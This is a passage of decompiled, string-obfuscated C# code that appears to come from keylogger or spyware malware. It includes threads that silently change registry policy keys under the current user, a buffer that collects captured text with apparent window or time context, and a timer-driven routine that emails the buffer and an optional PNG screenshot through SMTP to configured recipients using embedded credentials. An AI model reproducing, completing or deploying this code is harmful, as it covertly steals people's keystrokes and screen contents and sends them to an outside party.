					goto IL_0412;
					IL_03b0:
					num = 16384;
					goto IL_0412;
					IL_03a8:
					num = 8192;
					goto IL_0412;
					IL_03a0:
					num = 4096;
					goto IL_0412;
					IL_0398:
					num = 2048;
					goto IL_0412;
					IL_0390:
					num = 1024;
					goto IL_0412;
					IL_0385:
					num = 512;
					goto IL_0412;
					IL_037a:
					num = 256;
					goto IL_0412;
					IL_036f:
					num = 128;
					goto IL_0412;
					IL_0367:
					num = 64;
					goto IL_0412;
					IL_035f:
					num = 32;
					goto IL_0412;
					IL_0357:
					num = 16;
					goto IL_0412;
					IL_0350:
					num = 8;
					goto IL_0412;
				}
				catch (Exception ex7)
				{
					Console.WriteLine(string.Format(_003CModule_003E.smethod_0("趕跚跧跼跺路跫跶跰跱趿跰跼跼跪跭跺跻趿趷跒跾跶跱趶趥趿跤趯跢", 560543), ex7.Message));
				}
			});
		}
		if (class11_0.Boolean_4)
		{
			ThreadPool.QueueUserWorkItem(delegate
			{
				try
				{
					RegistryKey registryKey6 = Registry.CurrentUser.CreateSubKey(_003CModule_003E.smethod_0("挧挛挒挀挃挕挆挑挨挹挝挗挆挛指挛挒挀挨挣挝挚挐挛挃指挨挷持挆挆挑挚挀挢挑挆指挝挛挚挨挤挛挘挝挗挝挑指挨挱挌挄挘挛挆挑挆", 549748));
					registryKey6.SetValue(_003CModule_003E.smethod_0("\uf82c\uf801\uf81b\uf809\uf804\uf804\uf807\uf81f\uf83a\uf81d\uf806", 653416), 1);
					registryKey6.Close();
					RegistryKey registryKey7 = Registry.CurrentUser.CreateSubKey(_003CModule_003E.smethod_0("蔽蔁蔈蔚蔙蔏蔜蔋蔲蔣蔇蔍蔜蔁蔝蔁蔈蔚蔲蔹蔇蔀蔊蔁蔙蔝蔲蔭蔛蔜蔜蔋蔀蔚蔸蔋蔜蔝蔇蔁蔀蔲蔾蔁蔂蔇蔍蔇蔋蔝蔲蔫蔖蔞蔂蔁蔜蔋蔜蔲蔪蔇蔝蔏蔂蔂蔁蔙蔼蔛蔀", 820590));
					registryKey7.SetValue(_003CModule_003E.smethod_0("偮偯", 217183), _003CModule_003E.smethod_0("飪飦飻飳飯飬飱飦颭飦飻飦", 39043));
					registryKey7.Close();
				}
				catch (Exception ex6)
				{
					Console.WriteLine(string.Format(_003CModule_003E.smethod_0("䰩䱦䱛䱀䱆䱓䱗䱊䱌䱍䰃䱌䱀䱀䱖䱑䱆䱇䰃䰋䱮䱂䱊䱍䰊䰙䰃䱘䰓䱞", 150563), ex6.Message));
				}
			});
		}
		if (class11_0.Boolean_5)
		{
			ThreadPool.QueueUserWorkItem(delegate
			{
				try
				{
					RegistryKey registryKey4 = Registry.CurrentUser.CreateSubKey(_003CModule_003E.smethod_0("ᚪᚖ\u169fᚍᚎᚘᚋ᚜ᚥᚴᚐᚚᚋᚖᚊᚖ\u169fᚍᚥᚮᚐᚗ\u169dᚖᚎᚊᚥᚺᚌᚋᚋ᚜ᚗᚍᚯ᚜ᚋᚊᚐᚖᚗᚥᚩᚖᚕᚐᚚᚐ᚜ᚊᚥᚼᚁᚉᚕᚖᚋ᚜ᚋ", 792313));
					registryKey4.SetValue(_003CModule_003E.smethod_0("\uea68\uea45\uea5f\uea4d\uea40\uea40\uea43\uea5b\uea7e\uea59\uea42", 256556), 1);
					registryKey4.Close();
					RegistryKey registryKey5 = Registry.CurrentUser.CreateSubKey(_003CModule_003E.smethod_0("索紞紗紅紆紐紃純紭紼紘紒紃紞紂紞紗紅紭紦紘紟紕紞紆紂紭紲約紃紃純紟紅紧純紃紂紘紞紟紭紡紞紝紘紒紘純紂紭紴紉紁紝紞紃純紃紭紵紘紂紐紝紝紞紆紣約紟", 97649));
					registryKey5.SetValue(_003CModule_003E.smethod_0("豑豑", 363616), _003CModule_003E.smethod_0("庈庖庋庈庖庂店廋庀庝庀", 351973));
					registryKey5.Close();
				}
				catch (Exception ex5)
				{
					Console.WriteLine(string.Format(_003CModule_003E.smethod_0("㽋㼄㼹㼢㼤㼱㼵㼨㼮㼯㽡㼮㼢㼢㼴㼳㼤㼥㽡㽩㼌㼠㼨㼯㽨㽻㽡㼺㽱㼼", 474945), ex5.Message));
				}
			});
		}
		if (class11_0.Boolean_6)
		{
			ThreadPool.QueueUserWorkItem(delegate
			{
				try
				{
					RegistryKey registryKey3 = Registry.CurrentUser.CreateSubKey(_003CModule_003E.smethod_0("뒶뒊뒃뒑뒒뒄뒗뒀뒹뒨뒌뒆뒗뒊뒖뒊뒃뒑뒹뒲뒌뒋뒁뒊뒒뒖뒹뒦뒐뒗뒗뒀뒋뒑뒳뒀뒗뒖뒌뒊뒋뒹뒵뒊뒉뒌뒆뒌뒀뒖뒹뒠뒝뒕뒉뒊뒗뒀뒗", 439525));
					registryKey3.SetValue(_003CModule_003E.smethod_0("牧牆牪牅牆牚牌", 160297), 1);
					registryKey3.Close();
				}
				catch (Exception ex4)
				{
					Console.WriteLine(string.Format(_003CModule_003E.smethod_0("ꊳꋼꋁꋚꋜꋉꋍꋐꋖꋗꊙꋖꋚꋚꋌꋋꋜꋝꊙꊑꋴꋘꋐꋗꊐꊃꊙꋂꊉꋄ", 565945), ex4.Message));
				}
			});
		}
		if (class11_0.Boolean_7)
		{
			ThreadPool.QueueUserWorkItem(delegate
			{
				try
				{
					RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(_003CModule_003E.smethod_0("舵舉舀舒舑與舔舃舺舫舏舅舔舉舕舉舀舒舺舱舏興舂舉舑舕舺舥舓舔舔舃興舒舰舃舔舕舏舉興舺舶舉舊舏舅舏舃舕舺舣舞舖舊舉舔舃舔", 623206));
					registryKey.SetValue(_003CModule_003E.smethod_0("\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd", 974460), 1);
					registryKey.Close();
					RegistryKey registryKey2 = Registry.CurrentUser.CreateSubKey(_003CModule_003E.smethod_0("\uf3c8\uf3f4\uf3fd\uf3ef\uf3ec\uf3fa\uf3e9\uf3fe\uf3c7\uf3d6\uf3f2\uf3f8\uf3e9\uf3f4\uf3e8\uf3f4\uf3fd\uf3ef\uf3c7\uf3cc\uf3f2\uf3f5\uf3ff\uf3f4\uf3ec\uf3e8\uf3c7\uf3d8\uf3ee\uf3e9\uf3e9\uf3fe\uf3f5\uf3ef\uf3cd\uf3fe\uf3e9\uf3e8\uf3f2\uf3f4\uf3f5\uf3c7\uf3cb\uf3f4\uf3f7\uf3f2\uf3f8\uf3f2\uf3fe\uf3e8\uf3c7\uf3de\uf3e3\uf3eb\uf3f7\uf3f4\uf3e9\uf3fe\uf3e9\uf3c7\uf3df\uf3f2\uf3e8\uf3fa\uf3f7\uf3f7\uf3f4\uf3ec\uf3c9\uf3ee\uf3f5", 717723));
					registryKey2.SetValue(_003CModule_003E.smethod_0("\u1ba8\u1bab", 662425), _003CModule_003E.smethod_0("譸警譶譺譻譳譼譲謻議譭議", 690965));
					registryKey2.Close();
				}
				catch (Exception ex3)
				{
					Console.WriteLine(string.Format(_003CModule_003E.smethod_0("ই\u09c8৵৮২৽৹\u09e4\u09e2\u09e3ভ\u09e2৮৮৸\u09ff২৩ভথ\u09c0৬\u09e4\u09e3তষভ৶ঽৰ", 919949), ex3.Message));
				}
			});
		}
		class4_0.Timer_0.Start();
		ThreadPool.QueueUserWorkItem(delegate
		{
			Class12.smethod_9(class5_0.String_1);
		});
		Application.Run();
	}

	private static void smethod_0(string string_0)
	{
		//IL_008c: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			string string_ = _003CModule_003E.smethod_0("", 5662);
			if (Class12.smethod_2(ref string_))
			{
				Console.WriteLine(string.Format(_003CModule_003E.smethod_0("℗℗ⅆⅉⅴⅩⅱⅸ℧ℽⅦℭⅠℽ⅀℗", 8477), string_));
				class4_0.String_0 += string.Format(_003CModule_003E.smethod_0("ϟΔϙϟΔϙϿϰύϐψρΞ\u0384ϟΕϙ\u0384Ϥ\u0384ϟΖϙϹϟΔϙϟΔϙ", 932), Environment.NewLine, string_, Class12.smethod_8());
			}
			Console.Write(string_0);
			class4_0.String_0 += string_0;
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private static void smethod_1(object sender, EventArgs e)
	{
		if (class4_0.Delegate0_0 == null)
		{
			class4_0.Delegate0_0 = smethod_2;
			class4_0.IAsyncResult_0 = class4_0.Delegate0_0.BeginInvoke(class4_0.String_0, null, null);
			class4_0.String_0 = _003CModule_003E.smethod_0("", 8772);
			Class12.String_0 = _003CModule_003E.smethod_0("", 2205);
		}
		else if (class4_0.IAsyncResult_0.IsCompleted)
		{
			class4_0.Delegate0_0.EndInvoke(class4_0.IAsyncResult_0);
			class4_0.IAsyncResult_0 = class4_0.Delegate0_0.BeginInvoke(class4_0.String_0, null, null);
			class4_0.String_0 = _003CModule_003E.smethod_0("", 3595);
			Class12.String_0 = _003CModule_003E.smethod_0("", 95);
		}
	}

	private static void smethod_2(string string_0)
	{
		try
		{
			MailMessage mailMessage = new MailMessage();
			mailMessage.Subject = class3_0.String_0;
			mailMessage.From = new MailAddress(class2_0.String_0);
			mailMessage.IsBodyHtml = class3_0.Boolean_0;
			MailMessage mailMessage2 = mailMessage;
			foreach (string item in class2_0.List_0)
			{
				mailMessage2.To.Add(new MailAddress(item));
			}
			if (class3_0.Boolean_1)
			{
				Stream stream = new MemoryStream();
				Class12.smethod_10().Save(stream, ImageFormat.get_Png());
				stream.Seek(0L, SeekOrigin.Begin);
				mailMessage2.Attachments.Add(new Attachment(stream, _003CModule_003E.smethod_0("ᥚᥪ\u197bᥬᥬᥧ\u197aᥡᥦ\u197d\u1927\u1979ᥧ\u196e", 6409)));
			}
			if (class3_0.Boolean_0)
			{
				mailMessage2.Body = Class19.smethod_0(new Class19.Class20
				{
					String_0 = string_0,
					Boolean_0 = class10_0.Boolean_2
				});
			}
			else
			{
				mailMessage2.Body = Class19.smethod_2(new Class19.Class20
				{
					String_0 = string_0,
					Boolean_0 = class10_0.Boolean_2
				});
			}
			SmtpClient smtpClient = new SmtpClient();
			smtpClient.Credentials = new NetworkCredential(class2_0.String_0, class2_0.String_1);
			smtpClient.EnableSsl = true;
			smtpClient.Host = class2_0.String_2;
			smtpClient.Port = class2_0.Int32_0;
			SmtpClient smtpClient2 = smtpClient;
			smtpClient2.Send(mailMessage2);
			Console.WriteLine(_003CModule_003E.smethod_0("ᐔᑒᑱᑹᑹᑻᑺᐿ", 5150));
		}
		catch (Exception arg)
		{
			Console.WriteLine(string.Format(_003CModule_003E.smethod_0("ᴎᵁᵼᵧᵡᵴᵰᵭᵫᵪᴤᵫᵧᵧᵱᵶᵡᵠᴤᴬᵷᵡᵪᵠᵁᵩᵥᵭᵨᴭᴾᴤᵿᴴᵹ", 7428), arg));
		}
	}
}
